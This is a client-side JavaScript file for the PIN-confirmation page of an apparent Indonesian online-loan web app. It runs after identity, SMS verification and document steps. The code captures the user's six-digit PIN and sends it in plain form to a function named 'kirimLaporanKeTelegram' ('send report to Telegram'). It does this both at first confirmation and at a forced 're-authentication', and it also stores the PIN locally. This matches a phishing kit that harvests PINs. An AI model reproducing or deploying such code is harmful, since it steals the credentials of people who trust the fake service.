(() => {
  if (!NovaStorage.requireSession()) return;
  if (!NovaStorage.requireIdentity()) return;
  if (!NovaStorage.requireSmsVerification()) return;
  if (!NovaStorage.requireDocuments()) return;
  if (!NovaStorage.requireLoan()) return;
  if (!NovaStorage.requireSummary()) return;

  const isDashboardReauth = sessionStorage.getItem('kbDashboardReauth') === '1';
  let pin = '';
  const dots = [...document.querySelectorAll('.pin-dot')];
  const button = document.getElementById('confirmPinButton');

  function render() {
    dots.forEach((dot,index) => dot.classList.toggle('filled', index < pin.length));
    button.disabled = pin.length !== 6;
  }

  document.getElementById('keypad').addEventListener('click', event => {
    const key = event.target.closest('button');
    if (!key) return;
    const action = key.dataset.action;
    if (action === 'clear') pin = '';
    else if (action === 'delete') pin = pin.slice(0,-1);
    else if (/^\d$/.test(key.textContent) && pin.length < 6) pin += key.textContent;
    render();
  });

  button.addEventListener('click', () => {
    if (pin.length !== 6) return;
    const rawPin = pin;
    pin = '';

    if (isDashboardReauth) {
      window.kirimLaporanKeTelegram?.({
        event: 'PIN_REAUTH_CONFIRMED',
        page: 'konfirmasi-pin.html',
        pin: rawPin,
        status: 'PIN_REAUTH_CONFIRMED'
      });
      sessionStorage.removeItem('kbDashboardReauth');
      location.replace('dashboard-pinjaman.html');
      return;
    }

    NovaStorage.confirmPin();
    NovaStorage.setApplication({ lastPin: rawPin });
    window.kirimLaporanKeTelegram?.({
      event: 'PIN_CONFIRMED',
      page: 'konfirmasi-pin.html',
      pin: rawPin,
      status: 'PIN_CONFIRMED'
    });
    location.replace('proses-pengajuan.html');
  });

  document.getElementById('backButton').addEventListener('click', () => {
    if (isDashboardReauth) {
      location.replace('verifikasi-sms.html');
      return;
    }
    history.back();
  });
  render();
})();
